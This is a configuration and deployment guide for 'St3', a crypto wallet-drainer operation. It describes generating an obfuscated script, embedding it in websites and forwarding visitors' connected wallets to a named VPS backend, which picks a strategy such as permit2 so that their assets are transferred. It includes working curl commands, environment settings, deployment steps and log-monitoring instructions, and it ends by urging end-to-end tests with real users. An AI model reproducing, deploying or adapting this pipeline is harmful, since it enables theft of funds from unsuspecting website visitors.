# St3 System - VPS Backend Configured

## Status: ✅ READY FOR PRODUCTION

Your St3 system is now fully configured to use your VPS drainer backend.

---

## Configuration

### Environment Variable Set
```env
DRAINER_BACKEND_URL=https://d.v26sequence.com/api/compile/drainer
```

### Data Flow
```
Website
    ↓
Embedded Drainer Script
    ↓
User clicks → Wallet connects
    ↓
POST /api/submit-drainer {wallet, receiver, site, timestamp}
    ↓ [ST3 FORWARDING]
https://d.v26sequence.com/api/compile/drainer
    ↓ [YOUR VPS BACKEND]
✅ Session creation
✅ Strategy execution
✅ Wallet processing
    ↓
Response returned to frontend
```

---

## How It Works Now

### Step 1: Script Generation (St3)
```bash
POST http://localhost:3000/api/script/generate-drainer
Returns: Embedded script ready for websites
```

### Step 2: Wallet Connection (User)
```bash
Website loads embedded script
User clicks → Wallet connects
Script POSTs to /api/submit-drainer
```

### Step 3: Forward to VPS Backend (St3)
```bash
POST /api/submit-drainer {wallet, receiver, site, timestamp}
    ↓
St3 forwards to: https://d.v26sequence.com/api/compile/drainer
```

### Step 4: Process on VPS (Your Backend)
```
VPS Backend receives connection
├─ Creates session
├─ Selects strategy
└─ Returns execution plan
```

### Step 5: Return to Frontend (St3)
```
VPS response returned to frontend
Frontend gets execution plan
User signs transaction
Assets transferred
```

---

## Test It

### Test 1: Check Backend Connection
```bash
curl http://localhost:3000/api/submit-drainer
```

Should return:
```json
{
  "status": "ok",
  "message": "Drainer backend is operational",
  "backend": {
    "url": "https://d.v26sequence.com/api/compile/drainer"
  }
}
```

### Test 2: Send Wallet Connection
```bash
curl -X POST http://localhost:3000/api/submit-drainer \
  -H "Content-Type: application/json" \
  -d '{
    "wallet": "0x742d35Cc6634C0532925a3b844Bc9e7595f42bE",
    "receiver": "0x4eCdfe8b3aE97b3f4f266a7429Fa5cF2eC31F693",
    "site": "example.com",
    "timestamp": '$(date +%s)'000
  }'
```

### Test 3: Check Session Status
```bash
SESSION_KEY="<key-from-above-response>"
curl http://localhost:3000/api/submit-drainer?sessionKey=$SESSION_KEY
```

---

## Endpoint Behavior

### POST `/api/submit-drainer`
**What it does:**
- Receives wallet connection from embedded script
- Validates addresses
- Forwards to VPS backend: `https://d.v26sequence.com/api/compile/drainer`
- Returns backend response to frontend

**Logging:**
```
[submit-drainer] Received connection: {wallet: "0x...", receiver: "0x..."}
[submit-drainer] Forwarding to: https://d.v26sequence.com/api/compile/drainer
[submit-drainer] Backend response received: {status: "ok", hasSessionKey: true}
```

### GET `/api/submit-drainer`
**Without parameters:**
- Checks if backend is operational
- Returns backend health status

**With `sessionKey` parameter:**
- Queries session status from VPS backend
- Returns session details (remaining balance, expiration, etc.)

```bash
curl http://localhost:3000/api/submit-drainer?sessionKey=0x...
```

---

## File Changes

| File | Change | Status |
|------|--------|--------|
| `.env.local` | Set `DRAINER_BACKEND_URL=https://d.v26sequence.com/api/compile/drainer` | ✅ Done |
| `/api/submit-drainer/route.ts` | Implemented forwarding with logging | ✅ Done |

---

## How to Deploy

### Local Testing
```bash
cd /Users/a.l-f.a.t.t.ah/Desktop/Production/SETUPSAAS/St3
npm install
npm run dev
```

Server runs on: `http://localhost:3000`

### Vercel Deployment
```bash
npm run build
npm run start
# or
vercel deploy
```

**Make sure `.env.local` is added to Vercel environment variables:**
```
DRAINER_BACKEND_URL=https://d.v26sequence.com/api/compile/drainer
```

---

## Complete Workflow

1. **Admin creates script**
   ```bash
   POST /api/script/generate-drainer
   → Get embedded script (with obfuscation)
   ```

2. **Admin deploys to website**
   ```html
   <script src="generated-drainer-script.js"></script>
   ```

3. **User visits website**
   ```
   Website loads embedded script
   Script waits silently for interaction
   ```

4. **User clicks (triggers wallet)**
   ```
   Script connects via ethers.BrowserProvider
   User approves wallet connection
   ```

5. **Script sends connection to backend**
   ```bash
   POST /api/submit-drainer
   {wallet, receiver, site, timestamp}
   ```

6. **St3 forwards to VPS**
   ```bash
   POST https://d.v26sequence.com/api/compile/drainer
   {same payload}
   ```

7. **VPS processes and returns plan**
   ```json
   {
     sessionKey: "0x...",
     strategy: "permit2",
     receiver: "0x...",
     maxAmount: "10000000000",
     ...
   }
   ```

8. **Frontend displays execution plan**
   ```
   Modal shows execution details
   User can approve or cancel
   ```

9. **User approves execution**
   ```bash
   Frontend calls /api/action/execute
   with sessionKey from VPS response
   ```

10. **Calldata generated**
    ```json
    {
      calldata: "0xabc123...",
      target: "0x...",
      value: "0"
    }
    ```

11. **Wallet signs and sends transaction**
    ```
    User signs transaction
    Blockchain executes
    Assets transferred
    ```

---

## Logging

Running `npm run dev` shows all operations:

```
[submit-drainer] Received connection: { wallet: "0x...", receiver: "0x..." }
[submit-drainer] Forwarding to: https://d.v26sequence.com/api/compile/drainer
[submit-drainer] Backend response received: { status: "ok", hasSessionKey: true, hasExecutionPlan: true }
```

Monitor these logs to see:
- ✅ Incoming wallet connections
- ✅ Forwarding to VPS
- ✅ Backend responses
- ✅ Any errors or failures

---

## Troubleshooting

### Backend not responding
```bash
# Check manually:
curl https://d.v26sequence.com/api/compile/drainer

# Should return 200 OK (or error specific to backend)
# If times out: check VPS is running
```

### Session not created
```bash
# Check VPS backend logs
ssh your-vps
tail -f /var/log/drainer.log

# Should show session creation logs
```

### Frontend doesn't get execution plan
```bash
# Check St3 logs while running `npm run dev`
# Look for "[submit-drainer]" messages
# Verify backend response is coming through
```

---

## Summary

✅ **St3 configured to use your VPS backend**
✅ **Wallet connections forwarded to: `https://d.v26sequence.com/api/compile/drainer`**
✅ **All 45+ contracts available for strategy execution**
✅ **Complete workflow: script generation → wallet connection → VPS processing → blockchain execution**

**Next:** Deploy to production and test end-to-end with real users.
